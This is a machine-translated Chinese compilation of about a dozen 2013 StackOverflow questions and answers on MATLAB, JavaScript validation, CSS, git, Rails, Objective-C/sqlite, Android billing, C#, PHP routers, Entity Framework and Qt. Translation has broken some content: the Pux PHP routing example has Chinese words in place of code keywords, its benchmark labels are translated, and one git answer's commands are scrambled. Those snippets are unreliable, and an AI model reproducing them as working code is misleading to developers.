# StackOverflow 问答 15392000-15392999

# matlab - 错误：matlab.jar 中没有主要清单属性

> ID：15392000
> 
> 赞同：3
> 
> 时间：2013-03-13T17:13:34.200
> 
> 标签：matlab, manifest, mainclass

我在 Fedora 上安装了 MATLAB 并尝试使用 运行它`java -jar matlab.jar`，但出现此错误：

> `no main manifest attribute, in matlab.jar`

我在某处阅读以制作具有以下内容的清单文件：

```
Main-Class: MainClass 
```

但是当我`java -jar matlab`再次运行时，我得到了这个错误：

> `Error: Could not find or load main class MainClass`

我该如何解决这个问题？

# javascript - 如果 Select2 字段为空，LiveValidation 提交表单而不验证其他字段

> ID：15392001
> 
> 赞同：1
> 
> 时间：2013-03-13T17:13:35.707
> 
> 标签：javascript, jquery, html, validation, jquery-select2

我正在使用**LiveValidation**进行客户端表单验证。*[http://livevalidation.com/examples](http://livevalidation.com/examples)*

我还有一个应用了**Select2**的多选表单字段。

问题是，如果我将**Select2**字段留空（*不选择任何内容*），那么我的表单将在按下提交按钮后自行提交，而不验证任何其他表单字段。

但是，如果我确实在**Select2**字段中选择了某些内容并尝试提交表单，那么**LiveValidation**将尝试验证表单中的其他字段（*包括**Select2**字段*），如果它们验证失败 - 表单不会提交并提示用户首先修复错误。

**更新：**即使我从多选表单字段中删除了 Select2，当它为空/未选择任何内容时，LiveValidation 仍然会跳过验证。

* * *

**应用了Select2**的选择字段（*我使用 PHP 函数 getSelectOptions 使用表中单个列的行值填充选择的选项*）：

```
<form id="myform" name="myform" method="post" action="myscript.php">
...
<select id="myselect" name="myselect[]" multiple="multiple">
    <?php getSelectOptions("table_name", "column_name"); ?>
</select>
...
</form> 
```

以下是我如何将**Select2**应用于文件前面的选择字段：

```
$(function()
{
...
$('#myselect').select2({ placeholder: "Select items" });
...
}); 
```

在这里，我在**Select2之后将****LiveValidation**应用于选择字段（*通过添加****Validate.Presence****我告诉它选择字段不能为空/需要有一个值*）：

 ****```
$(function()
{
...
var myselect = new LiveValidation("myselect", { onlyOnSubmit: true });          
myselect.add(Validate.Presence);
...
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T18:30:10.230

```
<input type="text" value="Your Name" name="name" onblur="if (this.value == '') {this.value        = 'Your Name';}"  onfocus="if (this.value == 'Your Name') {this.value = '';}" /> 
```

用适合您情况的内容替换“您的姓名”。如果用户未填写此字段，它将恢复为该值并失败

哦，我误解了，所以要澄清而不是使用 onlyonSubmite:true... 会添加一个 ifelse 工作。

```
 if(!myselect) {
      throw error
  else { 
    //do what you need
   } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-28T23:08:17.137

我会将其添加为评论，但我还没有代表。尽管如此，我在使用 Ruby On Rails 的 select2 时遇到了完全相同的问题：即，如果该字段为空（在我的情况下也是多选），则跳过其他验证，两个客户端（我正在使用客户端验证）和服务器端（AJAX 响应）。

但是，与您的情况一样，如果 select2 字段中有选择，则所有其他验证都会正常触发。

我的（丑陋的）解决方法是在创建操作服务器端挑选空的 select2 字段，并通过 AJAX 将错误返回到模态（我的表单所在的位置）。这至少避免了我在控制台中遇到的讨厌的 500 错误。为了完整起见，以及在 ROR 领域遇到此问题的任何其他人，黑客代码如下所示：

```
 def create
  # messaged is params definition of field contents
  if messaged.blank?
   #create a dummy message instance
    @message = Message.new
   #add error and call the whole thing off
    @message.errors.add(:base, "No recipients selected.")
    return
  end
  #rest of the normal action...
 end 
```

这是模态JS：

```
var el = $('#new-message-form');

<% if @message.errors.any? %>

  // Create a list of errors
  var errors = $('<ul />');

  <% @message.errors.full_messages.each do |error| %>
    errors.append('<li><%= escape_javascript( error ) %></li>');
  <% end %>

  // Display errors on form

  $('.modalerrors').html(errors).show('slideDown');
  $('.modalerrors').delay(5000).hide('slideUp');

<% else %>

    $('#messageModal').modal('hide');

    // hide then Clear form and reload page

    $('#messageModal').on('hidden', function () {
        el.find('input:text,textarea').val('');
        el.find('.modalerrors').empty();
       <% @message = "" %>
        location.reload();
    });
<% end %> 
```

希望这可以帮助某人。或者更好的是，导致修复。****

# css - 垂直居中未知高度

> ID：15392002
> 
> 赞同：2
> 
> 时间：2013-03-13T17:13:38.267
> 
> 标签：css, center, vertical-alignment, centering

我试图在没有固定/指定高度的 DIV 中垂直居中图像。我已经尝试在[关于 CSS 技巧的未知文章中的居中进行](http://css-tricks.com/centering-in-the-unknown/)构建，但要使其正常工作，您需要指定高度。而是具有欺骗性的文章标题。

这是我的 JS 小提琴：http: [//jsfiddle.net/6J2WA/](http://jsfiddle.net/6J2WA/)

这就是我想要的（图片）：[http ://cl.ly/image/1k0h262c2c3s](http://cl.ly/image/1k0h262c2c3s)

**CSS**

```
/* This parent can be any width and height */
.block {
  text-align: center;
}

/* The ghost, nudged to maintain perfect centering */
.block:before {
  content: '';
  display: inline-block;
   height: 100%;
  vertical-align: middle;
  margin-right: -0.25em; /* Adjusts for spacing */
}

/* The element to be centered, can
also be of any width and height */ 
.centered {
  display: inline-block;
  vertical-align: middle;
}

.inner {
max-width: 960px;
margin: 0 auto;
overflow: hidden;
    background: #ef4;
}

.c-3 {  
width: 29.3%;
float: left;
margin-left: 6%;
    background: #e4f;
}

#you-and-us .c-3 { width: 33.5%; }
#you-and-us .c-3:first-child { text-align: right; margin: 0; }
#you-and-us .c-3:nth-child(2) { width: 21%; text-align: center; position: relative; } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:44:46.840

你不能使用伪元素技术的原因是你没有足够的祖先元素是元素高度的 100% `#you-and-us`。

如果你扔掉浮动并`display: table-cell`用于你的`.c-3`元素，你可以简化整个事情。

[http://jsfiddle.net/6J2WA/5/](http://jsfiddle.net/6J2WA/5/)

```
/* This parent can be any width and height */
.block {
    text-align: center;
}

.inner {
    max-width: 960px;
    margin: 0 auto;
    overflow: hidden;
    background: #ef4;
}

.c-3 {  
    display: table-cell;
    background: #e4f;
}

#you-and-us .c-3 { width: 33.5%; }
#you-and-us .c-3:first-child { text-align: right; }
#you-and-us .c-3:nth-child(2) { width: 21%; text-align: center; position: relative; background: yellow; vertical-align: middle; } 
```

# git - 如何从拉取请求中排除文件？

> ID：15392003
> 
> 赞同：8
> 
> 时间：2013-03-13T17:13:39.307
> 
> 标签：git, pull-request

我想执行一个拉取和合并请求，但我也想从这个拉取请求中排除一些文件。

```
Example: a.py  b.py c.py 
```

我想执行拉取请求并合并文件以外的`b.py`文件。

实现这一目标的最简单方法是什么？

[编辑] 该文件尚未提交。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-13T17:18:31.457

从您现在所在的位置创建两个分支，例如`my-pull-request`和`other-change`。

将 a.py 和 c.py 提交到`my-pull-request`，并将 b.py 提交到`other-change`. 将`my-pull-request`分支推送到 Github，并创建拉取请求。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-13T17:22:48.363

提交`a.py`，其余的，执行请求，然后`c.py`恢复你的`git stash``git stash pop``b.py`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:23:59.080

尝试拉取所有文件并将文件反转为特定提交。然后根据需要推送您的更改。您还可以堆叠更改、拉取然后应用您的堆栈

# ruby-on-rails-3 - 为什么我在更改路由文件时收到 502 Bad Gateway 错误？

> ID：15392004
> 
> 赞同：0
> 
> 时间：2013-03-13T17:13:40.493
> 
> 标签：ruby-on-rails-3, nginx, routes

每当我在 Rails 中的 routes.rb 文件中添加一行时，整个站点都会返回 502 Bad Gateway 错误。这是我要添加的行：

```
map.connect '/experience-and-share/featured-articles/authors/:author', :controller => content, :action => 'featured_articles_authors_redirect' 
```

回溯并没有告诉我任何事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T20:36:46.670

这只是一个语法错误，因为我忘记了控制器上的引号。

# ios - 在结构中传递 C 字符串时遇到问题

> ID：15392008
> 
> 赞同：1
> 
> 时间：2013-03-13T17:13:48.860
> 
> 标签：ios, objective-c, string

我无法从传递的结构中获取 char* 字符串。我有以下代码：

```
typedef struct {
    NSInteger id;
    char *title;
} Movie;

...

Movie movie = [self randomMovie];

NSInteger movieID = movie.id;
NSString *movieTitle = [NSString stringWithUTF8String:movie.title];
NSLog(@"movieTitle: %@", movieTitle);

...

- (Movie)randomMovie {
sqlite3_stmt *statement;
NSString *query = @"SELECT id, title FROM movies ORDER BY RANDOM() LIMIT 1;";

Movie movie;

if (sqlite3_prepare_v2(database, [query UTF8String], -1, &statement, nil) == SQLITE_OK) {
    if (sqlite3_step(statement) == SQLITE_ROW) {
        // Get the id and title of the first
        movie.id = sqlite3_column_int(statement, 0);
        movie.title = (char *)sqlite3_column_text(statement, 1);
    }
}

NSLog(@"Random movie %d title: %@", movie.id, [NSString stringWithUTF8String:movie.title]);

sqlite3_finalize(statement);
return movie;
} 
```

这给了我输出：

```
2013-03-13 10:10:39.438 Fabflix[89156:c07] Random movie 872011 title: Ray
2013-03-13 10:10:39.439 Fabflix[89156:c07] movieTitle: (null) 
```

有谁知道为什么标题字符串没有从 randomMovie 正确传递？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:20:24.103

我对 sqlite3 C API 不是很熟悉，但是您确定`sqlite3_finalize()`调用不会破坏从返回的 C 字符串`sqlite3_column_text()`吗？你可能需要`strdup()`那个东西（然后再记住`free()`它）。

**更新**：是的，来自文档：

> 返回的指针在发生上述类型转换之前有效，或者直到调用 sqlite3_step() 或 sqlite3_reset() 或 sqlite3_finalize()。用于保存字符串和 BLOB 的内存空间会自动释放。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:21:47.097

调用返回的内存[`sqlite3_column_text`立即释放`sqlite3_finalize`](http://www.sqlite.org/c3ref/column_blob.html)。您需要先将该值复制到您自己的字符串中。

```
typedef struct {
    NSInteger id;
    NSString *title;
} Movie;

/* ... */

movie.title =
    [NSString stringWithUTF8String:(char *)sqlite3_column_text(statement, 1)]; 
```

# android - Android 应用内计费错误 - mQueryFinishedListener 无法解析为变量

> ID：15392011
> 
> 赞同：0
> 
> 时间：2013-03-13T17:13:52.310
> 
> 标签：android, in-app-billing

我无法设置应用内结算功能。正如文档中所写，我已经完成了以下代码的所有工作。

```
package com.fstaer.android;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;

import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;

import com.example.android.trivialdrivesample.util.IabHelper;
import com.example.android.trivialdrivesample.util.IabHelper.QueryInventoryFinishedListener;
import com.example.android.trivialdrivesample.util.IabResult;
import com.example.android.trivialdrivesample.util.Inventory;
import com.example.android.trivialdrivesample.util.Purchase;

public class Getcredits extends Activity{
    IabHelper mHelper;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.purchase_credits);
        String base64EncodedPublicKey = "my public key setup successfully";

        // compute your public key and store it in base64EncodedPublicKey
        mHelper = new IabHelper(this, base64EncodedPublicKey);
        mHelper.startSetup(new IabHelper.OnIabSetupFinishedListener() {
               public void onIabSetupFinished(IabResult result) {
                  if (!result.isSuccess()) {
                     // Oh noes, there was a problem.
                     Log.d("getcr", "Problem setting up In-app Billing: " + result);
                  }            
                     // Hooray, IAB is fully set up!  
                  List additionalSkuList = new ArrayList();
                  additionalSkuList.add("record_pack1");
                  //additionalSkuList.add(SKU_BANANA);
                  mHelper.queryInventoryAsync(true, additionalSkuList,
                     mQueryFinishedListener);
               }
        });

    }
    @Override
    public void onDestroy() {
        super.onDestroy();
       if (mHelper != null) mHelper.dispose();
       mHelper = null;
    }
} 
```

我收到错误 - mQueryFinishedListener 无法解析为变量

如果我把`QueryInventoryFinishedListener mQueryFinishedListener = null;` 它创建 java.lang.nullpointerexception 请任何人帮我设置应用内计费

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:17:38.743

添加

```
QueryInventoryFinishedListener 
   mQueryFinishedListener = new QueryInventoryFinishedListener() {
   public void onQueryInventoryFinished(IabResult result, Inventory inventory)   
   {
      if (result.isFailure()) {
         // handle error
         return;
       }

       String applePrice =
          inventory.getSkuDetails(SKU_APPLE).getPrice();
       String bananaPrice =
          inventory.getSkuDetails(SKU_BANANA).getPrice();

       // update the UI 
   }
}; 
```

到你的班级。

如果你把它赋值为null，你显然会得到一个NPE。不要那样做。

# facebook - 建议框未显示任何结果

> ID：15392015
> 
> 赞同：1
> 
> 时间：2013-03-13T17:14:11.077
> 
> 标签：facebook, plugins

我一直在为我们为客户运行的博客使用 Facebook 的 Recommendations Box 插件。我们使用 iframe 版本。直到最近它才开始按预期工作，当时它开始简单地显示“尚无此网站的推荐”。

[http://www.massvacation.com/blog/](http://www.massvacation.com/blog/)

我去了这个插件的开发人员参考以尝试重新生成代码：

[https://developers.facebook.com/docs/reference/plugins/recommendations/](https://developers.facebook.com/docs/reference/plugins/recommendations/)

但是，那里的预览也提出了“没有建议”。好奇，我尝试插入一些绝对应该有结果的大牌网站：bbc、buzzfeed，所有这些网站都没有显示。

所以我的问题是，是我做错了什么，还是 Facebook 端有问题？有没有人有这个小部件目前在某处正常工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:52:56.840

正如 Michel 上面所说，时间解决了问题，而我没有采取任何进一步的行动。

# c# - c# MySql 数据列表

> ID：15392016
> 
> 赞同：-3
> 
> 时间：2013-03-13T17:14:10.830
> 
> 标签：c#, mysql, list

基本上我想做的是**从表中读取数据**，然后**将该数据添加到适当的列表中**。

例如

```
List<int> value;
SELECT Values_To_Add FROM table
value.add(Values_To_Add) 
```

显然使用正确的 C# MySql 语法。我该怎么做呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:21:58.910

我认为以下内容可能是您正在寻找的内容：

```
List<int> values = new List<int>();

string sql = "SELECT Values_To_Add FROM table";
command.CommandText = sql;
MySqlDataReader reader = command.ExecuteReader();

while(reader.Read())
{
  values.Add(reader["Values_To_Add "]);
} 
```

您可能会向 Google 询问有关设置 MySqlReader 等的信息。

希望这会有所帮助，这应该是一个开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:22:29.670

尝试

```
List<int> values;

var result = from value in table
             select value;

foreach(var item in result) values.Add(item); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:22:50.450

研究使用`SQLDataReader`类。

经过研究，您应该能够使用数据阅读器从表中读取行，然后将它们添加到您的列表中：)

教程：[http ://csharp-station.com/Tutorial/AdoDotNet/Lesson04](http://csharp-station.com/Tutorial/AdoDotNet/Lesson04)

MSDN：http: [//msdn.microsoft.com/en-GB/library/system.data.sqlclient.sqldatareader.aspx](http://msdn.microsoft.com/en-GB/library/system.data.sqlclient.sqldatareader.aspx)

# java - 更好的井字游戏人工智能

> ID：15392018
> 
> 赞同：-7
> 
> 时间：2013-03-13T17:14:13.107
> 
> 标签：java, swing, user-interface, artificial-intelligence

我正在创建一个包含 PC 播放器的井字游戏。它是一个 3 x 3 的游戏板，然后包含 9 个按钮。一旦人类玩家点击一个按钮（这意味着，标记'x'），PC 玩家会自动选择下一个。请看下面**这段**代码，它是我为 PC 播放器开发的，用于选择合适的按钮来标记“o”。

```
if(buttons[1].getText().equals("O") && buttons[2].getText().equals("O") && buttons[3].getText().equals("")){
            buttons[3].setText("O");
            buttons[3].setEnabled(false);
        } else if(buttons[4].getText().equals("O") && buttons[5].getText().equals("O") && buttons[6].getText().equals("")){
            buttons[6].setText("O");
            buttons[6].setEnabled(false);
        } else if(buttons[7].getText().equals("O") && buttons[8].getText().equals("O") && buttons[9].getText().equals("")){
            buttons[9].setText("O");
            buttons[9].setEnabled(false);                
        } 
```

我对此不满意。这只是一小块，If else 很长，一个一个地检查每个按钮。我不能称它为人工智能。如果我将网格设为 4 x 4，这意味着我需要编辑整个网格！

有没有更好的方法来选择 PC 播放器的“o”标记按钮？请帮忙！

**更新**

我不是在寻找获胜状态的集合。我正在寻找一种算法或可以消除 if else 的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T17:16:42.373

您可以通过枚举所有游戏状态来解决井字游戏。您可以削减一些角落，但数量不多。

这是一个很好的图形表示如何做到这一点。 [http://xkcd.com/832/](http://xkcd.com/832/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:28:12.100

我在大学的 AI 课上（几乎）做了这件事。我使用的解决方案是创建几个函数，例如`findBestMove()`等`isGameOver()`。AI 部分是辅助函数，例如`lastSuccessfulMoveForScenario()`. Tic-Tac-Toe 非常简单，我只需将之前的每一步以及它是否导致胜利都存储在内存中。然后，我重播成功的动作并删除表现不佳的动作。随着游戏的进行，人工智能在玩游戏方面变得越来越好。不确定这是否是您要查找的内容，但希望对您有所帮助。

编辑：

我还应该指出，实际上只有少数几个小案例可以让 AI 做出任何真正的决定。很明显，您必须阻止胜利，并且如果可以的话，您应该获胜。如果我记得只有四分之一的动作最终使用了“AI”引擎。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-13T17:41:34.750

对于这一点，if else 是唯一的方法。尽管它很长，但这是我们必须做的。检查所有获胜条件，如果没有则移动

# php - 是否有独立的 PHP 路由库？

> ID：15392024
> 
> 赞同：40
> 
> 时间：2013-03-13T17:14:27.390
> 
> 标签：php, frameworks, routing

我希望向 PHP 应用程序添加一些动态的 REST 式路由。我很想使用现有的路由库，这样我就不必重新发明轮子了。

然而，当我看到像 Slim 和 F3 这样的东西时，它们都带有我不想要的东西——比如模板和 MVC——包括在内。因为我只想要路由，所以我最终会在我的应用程序中得到很多我不需要的框架代码。

那里有一个只做路由的好图书馆吗？还是我坚持导入完整的框架或重新发明轮子？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-03-13T17:18:36.763

试试**克莱因**：

单个文件，独立且健壮：

“klein.php 是适用于 PHP 5.3+ 的闪电般快速的路由器”

*   灵活的正则表达式路由（受 Sinatra 启发）
*   一组用于快速构建 Web 应用程序的样板方法
*   几乎没有开销 => 2500+ 请求/秒

[https://github.com/chriso/klein.php](https://github.com/chriso/klein.php)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2015-03-26T16:38:40.340

由于这个问题的答案很老，我认为在 OP 中提及一些更新的案例解决方案是一个不错的主意。

看到您的问题后，我想到的 2 个解决方案：

*   **FastRoute** [https://github.com/nikic/FastRoute](https://github.com/nikic/FastRoute) - 由 Nikita Popov 撰写
*   **Phroute** [https://github.com/mrjgreen/phroute](https://github.com/mrjgreen/phroute) - 由 Joe Green 撰写

Phroute 建立在 FastRoute 之上，因此它们都需要 PHP 5.4。

如果你需要 PHP 5.3+ 的解决方案，我肯定会推荐 Slim Framework 的路由。如果您不想要框架附带的任何其他功能，您可以提取路由部分并仅使用它们（SLIM 已获得 MIT 许可，因此您可以做任何事情）

我已经在我的一个项目中单独使用了 slim 路由 - DaGhostman\CodeWave @ github，请参阅标签 <=2.4，相关部分在`Application\Core`&中`Application\Controller`。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-07-03T13:30:11.370

尝试调度：[https ://github.com/noodlehaus/dispatch](https://github.com/noodlehaus/dispatch)

```
require 'dispatch.php';

get('/', function () {
   echo "Hello world!\n";
});

dispatch(); 
```

它是 PHP 的单文件路由框架。重量很轻，很容易使用。这个和 Slim 是我的最爱。

我根本不需要一个成熟的框架。如果您需要 ORM，请尝试 Redbean。

如果您需要模板引擎，请使用 Twig。

使用这种方法，您只需安装您使用的内容。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2014-04-06T08:59:36.833

Fastroute 是一个独立的路由库。它基于 OOP 模型并具有完整的测试框架。开源和许可是免费的。如果您正在为自己的项目寻找修改的东西，这是一个很好的起点。

[https://github.com/nikic/FastRoute](https://github.com/nikic/FastRoute)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2015-09-08T12:39:13.023

[PHP - 非常简单 路由器](http://upshots.org/php/php-seriously-simple-router)非常简单。
[PHP – RegexRouter](http://upshots.org/php/php-regexrouter)在我看来更好:)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2014-01-09T07:08:02.983

查看 Pux ( [https://github.com/c9s/Pux](https://github.com/c9s/Pux) )，它的目标是极高性能、零依赖、零开销（支持 C 扩展）。在提供良好性能的同时，Pux 还提供了类似 Sinatra 的 API 供您定义自己的路由路径：

```
$mux = 新的 Pux\Mux;
$mux->any('/product', ['ProductController','listAction']);
$mux->get('/product/:id', ['ProductController','itemAction'] , [
    '需要' => ['id' => '\d+', ],
    '默认' => ['id' => '1', ]
]);
$mux->post('/product/:id', ['ProductController','updateAction'] , [
    '需要' => ['id' => '\d+', ],
    '默认' => ['id' => '1', ]
]);
$mux->delete('/product/:id', ['ProductController','deleteAction'] , [
    '需要' => ['id' => '\d+', ],
    '默认' => ['id' => '1', ]
]);
$route = $mux->dispatch('/product/1');

```

基准测试结果：

*   在静态路由调度中比“symfony/routing”快 48.5 倍。（安装了 pux 扩展）
*   在正则表达式调度中比“symfony/routing”快 31 倍。（安装了 pux 扩展）
*   比“klein”（安装了 pux 扩展）快 69 倍。

```
n=10000
运行 php 数组 - . 138796.45654569/s
运行 pux - 。124982.98519026/s
运行克莱因 - 。1801.5070399717/s
火腿肠——。13566.734991391/s
奔跑光环——。39657.986477172/s
运行 symfony/路由 - . 1934.2415677861/s

                     Rate Mem php array pux aura ham symfony/routing klein
      php 数组 138.8K/s 0B ---90% -28% -9% -1% -1%
            像素 124.98K/s 0B 111% -- -31%-10% -1% -1%
           光环 39.66K/s 0B 349%315% ---34% -4% -4%
            火腿 13.57K/s 0B 1023%921% 292% -- -14% -13%
symfony/路由 1.93K/s 786K 7175%6461%2050%701% -- -93%
          克莱因 1.8K/s 262K 7704%6937%2201%753% 107% --

=================================== 条形图============== =====================

        php 数组 138.8K/s | ██████████████████████████████████████████████████ ██████████ |
              像素 124.98K/s | ██████████████████████████████████████████████████ ████ |
             光环 39.66K/s | █████████████████ |
              火腿 13.57K/s | █████ |
  symfony/路由 1.93K/s | |
            克莱因 1.8K/s | |

=============================== 系统信息================== =============

PHP版本：5.5.6
CPU 品牌字符串：Intel(R) Core(TM) i5-3427U CPU @ 1.80GHz

使用 XDebug 扩展。

```

Pux 尽量不消耗计算时间来动态构建所有路由（如 Symfony/Routing）。相反，Pux 将您的路由编译为普通的 PHP 数组进行缓存，编译后的路由可以非常快速地从缓存中加载。

借助 Pux PHP 扩展支持，您可以比纯 PHP Pux 快 1.5~2 倍地加载和调度路由。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-03-13T17:20:44.293

看看[**锂框架**](http://lithify.me/docs/lithium/net/http/Router)[的路由器类](http://lithify.me/docs/lithium/net/http/Router)**，因为大量使用依赖注入，你可以配置路由器类，通过[调用`config()`](http://lithify.me/docs/lithium/net/http/Router%3a%3aconfig%28%29)**

# sql - 如何加快我的实体框架代码？

> ID：15392026
> 
> 赞同：1
> 
> 时间：2013-03-13T17:14:31.510
> 
> 标签：sql, performance, entity-framework

我的 SQL 和实体框架知识有些有限。在一个实体框架 (4) 应用程序中，我注意到完成我的一个方法调用需要很长时间（大约 2 分钟）。第一个查询不需要太多时间，但是当我遍历查询返回的实体框架对象时，即使我只是读取（而不是修改）我应该得到的数据，完成嵌套循环也需要很长时间，即使每个列表中只有几十个条目和几级循环。

我希望下面的示例可以用更高级的查询重新编写，该查询可能包括我在循环中使用一些我真的不知道如何使用的 SQL 词进行的所有过滤，所以如果有人可以告诉我什么等效的 SQL 表达式将是，这对我来说非常有教育意义，并且可能解决我当前的性能问题。

此外，由于此应用程序的其他部分和我开发的其他应用程序经常想要对 SQL 数据进行更复杂的计算，我还想知道一种将数据从 Entity Framework 检索到本地内存对象的好方法，这些对象在读取时不会有很大的延迟他们。在我的 LINQ-to-SQL 项目中存在类似的性能问题，我通过重构整个应用程序以将所有 SQL 数据加载到 RAM 中的并行对象中解决了这个问题，我必须自己编写，我想知道是否没有一种更好的方法来告诉 Entity Framework 不要继续执行它正在执行的任何高延迟通信，或者加载到本地 RAM 对象中。

在下面的示例中，代码通过 SQL 查询获取某个成员（即人）在某个日期的食物菜单项列表，然后我使用其他查询和循环根据两个条件过滤掉菜单项： 1 ) 如果该成员对配方所属的任何组 id 的评分为零（多对多关系），并且 2) 如果该成员对配方本身的评分为零。

例子：

```
List<PFW_Member_MenuItem> MemberMenuForCookDate =
            (from item in _myPfwEntities.PFW_Member_MenuItem
             where item.MemberID == forMemberId
             where item.CookDate == onCookDate
             select item).ToList();

        // Now filter out recipes in recipe groups rated zero by the member:
        List<PFW_Member_Rating_RecipeGroup> ExcludedGroups =
            (from grpRating in _myPfwEntities.PFW_Member_Rating_RecipeGroup
             where grpRating.MemberID == forMemberId
             where grpRating.Rating == 0
             select grpRating).ToList();
        foreach (PFW_Member_Rating_RecipeGroup grpToExclude in ExcludedGroups)
        {
            List<PFW_Member_MenuItem> rcpsToRemove = new List<PFW_Member_MenuItem>();
            foreach (PFW_Member_MenuItem rcpOnMenu in MemberMenuForCookDate)
            {
                PFW_Recipe rcp = GetRecipeById(rcpOnMenu.RecipeID);
                foreach (PFW_RecipeGroup group in rcp.PFW_RecipeGroup)
                {
                    if (group.RecipeGroupID == grpToExclude.RecipeGroupID)
                    {
                        rcpsToRemove.Add(rcpOnMenu);
                        break;
                    }
                }
            }
            foreach (PFW_Member_MenuItem rcpToRemove in rcpsToRemove)
                MemberMenuForCookDate.Remove(rcpToRemove);
        }
        // Now filter out recipes rated zero by the member:
        List<PFW_Member_Rating_Recipe> ExcludedRecipes =
            (from rcpRating in _myPfwEntities.PFW_Member_Rating_Recipe
             where rcpRating.MemberID == forMemberId
             where rcpRating.Rating == 0
             select rcpRating).ToList();
        foreach (PFW_Member_Rating_Recipe rcpToExclude in ExcludedRecipes)
        {
            List<PFW_Member_MenuItem> rcpsToRemove = new List<PFW_Member_MenuItem>();
            foreach (PFW_Member_MenuItem rcpOnMenu in MemberMenuForCookDate)
            {
                if (rcpOnMenu.RecipeID == rcpToExclude.RecipeID)
                    rcpsToRemove.Add(rcpOnMenu);
            }
            foreach (PFW_Member_MenuItem rcpToRemove in rcpsToRemove)
                MemberMenuForCookDate.Remove(rcpToRemove);
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T22:37:27.960

您可以使用 EFProf [http://www.hibernatingrhinos.com/products/EFProf](http://www.hibernatingrhinos.com/products/EFProf)来跟踪查看 EF 发送到 SQL 的确切内容。它还可以显示您发送了多少查询以及有多少独特查询。它还为您提供了对每个查询的一些分析（例如，它是否未绑定等）。具有导航属性的实体框架，很容易没有意识到您正在发出数据库请求。当您处于循环中并具有导航属性时，您会遇到 N + 1 问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T22:18:34.980

如果您首先使用代码来启用代理，则可以在模型的 List 部分使用关键字 Virtual，这样您就不必一次取回所有数据，只需在需要时即可。

还考虑对只读数据使用 NoTracking

```
context.bigTable.MergeOption = MergeOption.NoTracking; 
```

# c++ - 没有合适的默认构造函数可用，但声明了构造函数

> ID：15392029
> 
> 赞同：0
> 
> 时间：2013-03-13T17:14:39.810
> 
> 标签：c++, qt, window, parent-child

我想从主窗口创建一个窗口，并向它发送一个指向我的主窗口的指针。我做了一次，我会再做一次，但是第二次，我总是在编译时出现这个错误“没有合适的默认构造函数可用”

主窗口：

```
#include "costsimulator.h"
#include "ui_costsimulator.h"

#include "stonepricewindow.h"

CostSimulator::CostSimulator(AionEnhancingSimulator *parent) : ui(new Ui::CostSimulator)
{
ui->setupUi(this);

parentPtr = parent;
stonePrice = createStonePrice();
connect(ui->aionEnhancingSimulator, SIGNAL(clicked()), this, SLOT(showAionEnhancingSimulatorWindow()));
connect(ui->stonePriceButton, SIGNAL(clicked()), this, SLOT(showStonePriceWindow()));
}

CostSimulator::~CostSimulator()
{
delete ui;
}

void CostSimulator::showAionEnhancingSimulatorWindow()
{
this->hide();
parentPtr->show();
}

QStringList *createStonePrice()
{
QStringList *tmp = new QStringList();

tmp->push_back(QString("80-30000000"));
return (tmp);
}

void CostSimulator::showStonePriceWindow()
{
StonePriceWindow *stonepricewindow = new StonePriceWindow(this);
stonepricewindow->show();
}

QStringList *CostSimulator::getStonePrice()
{
return (stonePrice);
} 
```

和标题：

```
#ifndef COSTSIMULATOR_H
#define COSTSIMULATOR_H

#include <QDialog>

#include "aionenhancingsimulator.h"

namespace Ui {
class CostSimulator;
}

class CostSimulator : public QDialog
{
Q_OBJECT

public:
AionEnhancingSimulator *parentPtr;
explicit CostSimulator(AionEnhancingSimulator *parent);
~CostSimulator();

QStringList *stonePrice;

QStringList *createStonePrice();
QStringList *getStonePrice();
void showStonePriceWindow();

public slots:
void showAionEnhancingSimulatorWindow();

private:
Ui::CostSimulator *ui;
};

#endif // COSTSIMULATOR_H 
```

和导致问题的窗口：

```
#include "stonepricewindow.h"
#include "ui_stonepricewindow.h"
#include <QStringListModel>
#include <QStandardItemModel>
#include <QtGui>

StonePriceWindow::StonePriceWindow(CostSimulator *parent) : ui(new Ui::StonePriceWindow)
{
ui->setupUi(this);
displayStonePriceList(parent);
}

StonePriceWindow::~StonePriceWindow()
{
delete ui;
}

void StonePriceWindow::displayStonePriceList(CostSimulator *parent)
{
// To do
} 
```

标题

```
#ifndef STONEPRICEWINDOW_H
#define STONEPRICEWINDOW_H

#include <QDialog>

#include "costsimulator.h"

namespace Ui {
class StonePriceWindow;
}

class StonePriceWindow : public QDialog
{
Q_OBJECT

public:
explicit StonePriceWindow(CostSimulator *parent = 0);
~StonePriceWindow();

void displayStonePriceList(CostSimulator *parent);

private:
Ui::StonePriceWindow *ui;
};

#endif // STONEPRICEWINDOW_H 
```

